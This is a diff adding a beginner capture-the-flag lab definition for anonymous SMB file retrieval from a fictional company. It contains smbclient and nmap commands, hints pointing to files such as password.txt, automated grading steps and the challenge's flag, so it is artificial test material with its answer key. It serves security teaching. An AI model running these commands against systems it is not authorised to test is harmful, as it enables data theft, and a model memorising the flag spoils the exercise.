@@ -1,0 +1,199 @@
+name: SMB File Retrieval
+description: Demonstrate the impact of anonymous SMB access by retrieving files from FinanceCorp's exposed shares.
+difficulty: beginner
+category: enumeration
+duration_minutes: 120
+objectives:
+  - download file from anonymous smb share
+  - Understand SMB enumeration techniques
+  - Capture the flag
+
+scenario: |
+  Your assessment of FinanceCorp's SMB shares has confirmed that anonymous access is 
+  permitted. James Mitchell wants to understand the full impact of this misconfiguration 
+  by seeing what files can actually be retrieved.
+  
+  Being able to download files from anonymous shares demonstrates a real information 
+  disclosure vulnerability. FinanceCorp needs to see concrete evidence of what an 
+  attacker could access to prioritize remediation efforts.
+  
+  Your objective: Retrieve files from FinanceCorp's anonymous SMB shares. Download 
+  and examine the contents to demonstrate the information disclosure risk. Document 
+  what sensitive information, if any, is exposed through this misconfiguration.
+
+flag: "OCR{smb_f1l3_r3tr13v3}"
+
+hints:
+  - text: |
+      **File retrieval from SMB shares** demonstrates the real-world impact of anonymous access. While listing files shows what's accessible, downloading files proves attackers can actually exfiltrate data.
+
+      **Why file retrieval matters:**
+      - **Proof of concept**: Demonstrates actual data exposure
+      - **Risk assessment**: Shows what sensitive data is accessible
+      - **Business impact**: Quantifies potential data breach
+      - **Remediation priority**: Helps prioritize security fixes
+      - **Compliance**: May reveal regulatory violations
+
+      Successfully downloading files from anonymous shares proves a critical security vulnerability.
+    unlock_after_minutes: 0
+
+  - text: |
+      **smbclient file download commands** provide multiple methods for retrieving files:
+
+      **Single file download:**
+      - `get filename`: Download a single file
+      - `get filename localname`: Download and rename
+
+      **Multiple file download:**
+      - `mget pattern`: Download files matching pattern
+      - `mget *`: Download all files in current directory
+      - `prompt`: Toggle interactive prompts for mget
+
+      **Directory operations:**
+      - `cd directory`: Change to directory before downloading
+      - `recurse`: Enable recursive directory operations
+      - `mask`: Set filename mask for mget
+
+      The `get` command is the fundamental file retrieval operation in smbclient.
+    unlock_after_minutes: 5
+
+  - text: |
+      **File download workflow** typically follows these steps:
+
+      1. **Connect to share**: `smbclient //target/share -N`
+      2. **List contents**: `ls` to see available files
+      3. **Navigate directories**: `cd` to find target files
+      4. **Download files**: `get filename` to retrieve
+      5. **Verify download**: Check local filesystem for file
+      6. **Examine contents**: `cat filename` to read contents
+
+      **Best practices:**
+      - Document all downloaded files
+      - Note file paths and names
+      - Record file sizes and timestamps
+      - Identify sensitive information
+      - Report findings to client
+
+      This systematic approach ensures thorough documentation of the vulnerability.
+    unlock_after_minutes: 10
+
+  - text: |
+      **smbclient file download syntax:**
+
+      **Interactive mode:**
+      ```bash
+      smbclient //target/share -N
+      smb: \> ls
+      smb: \> get filename.txt
+      smb: \> exit
+      ```
+
+      **Non-interactive mode:**
+      ```bash
+      smbclient //target/share -N -c 'get filename.txt'
+      ```
+
+      **Download and rename:**
+      ```bash
+      smbclient //target/share -N -c 'get remote.txt local.txt'
+      ```
+
+      **Multiple files:**
+      ```bash
+      smbclient //target/share -N
+      smb: \> prompt
+      smb: \> mget *.txt
+      ```
+
+      **Useful commands:**
+      - `lcd`: Change local directory
+      - `!ls`: Execute local commands
+      - `!pwd`: Show local working directory
+    unlock_after_minutes: 15
+
+  - text: |
+      To retrieve files from FinanceCorp's anonymous SMB share:
+
+      ```bash
+      smbclient //<target>/Public -N
+      smb: \> ls
+      smb: \> get filename.txt
+      ```
+
+      This workflow:
+      1. Connects to the Public share anonymously
+      2. Lists available files
+      3. Downloads the target file
+      4. Saves file to current local directory
+
+      **For non-interactive download:**
+      ```bash
+      smbclient //<target>/Public -N -c 'get flag.txt'
+      ```
+
+      **After downloading, examine the file:**
+      ```bash
+      cat filename.txt
+      less filename.txt
+      ```
+
+      Downloaded files are saved to your current working directory by default.
+    unlock_after_minutes: 20
+
+  - text: |
+      Successful file retrieval output:
+
+      ```bash
+      smb: \> ls
+        .                                   D        0  Mon Jan  1 12:00:00 2024
+        ..                                  D        0  Mon Jan  1 12:00:00 2024
+        flag.txt                            A       45  Mon Jan  1 12:00:00 2024
+        readme.txt                          A      124  Mon Jan  1 12:00:00 2024
+
+      smb: \> get flag.txt
+      getting file \flag.txt of size 45 as flag.txt (11.0 KiloBytes/sec) (average 11.0 KiloBytes/sec)
+
+      smb: \> exit
+      ```
+
+      **On local system:**
+      ```bash
+      $ ls -l flag.txt
+      -rw-r--r-- 1 user user 45 Jan 1 12:00 flag.txt
+
+      $ cat flag.txt
+      OCR{...}
+      ```
+
+      **What to document:**
+      - Files successfully downloaded
+      - File contents and sensitivity
+      - Evidence of information disclosure
+      - Potential business impact
+
+      **Common file locations:**
+      - Root of share
+      - Subdirectories (check with `ls` and `cd`)
+      - Files with obvious names (flag.txt, password.txt, etc.)
+
+      The flag is likely in a text file within the anonymous share. Download and examine any text files you find.
+    unlock_after_minutes: 25
+workbook: "wiki/range/winpt/CH02_SMB_Reconnaissance/04_File_Retrieval/"
+
+test:
+  steps:
+    - name: "Verify SMB port 445 is open"
+      command: "nmap -Pn -p 445 {target.target} | grep '445/tcp'"
+      expect: "open"
+
+    - name: "List SMB shares anonymously"
+      command: "smbclient -L //{target.target} -N 2>&1"
+      expect: "public"
+
+    - name: "List files in public share to find flag.txt"
+      command: "smbclient //{target.target}/public -N -c 'ls' 2>&1"
+      expect: "flag.txt"
+
+    - name: "Download and display flag file from SMB share"
+      command: "smbclient //{target.target}/public -N -c 'get flag.txt -' 2>/dev/null"
+      expect: "OCR{"
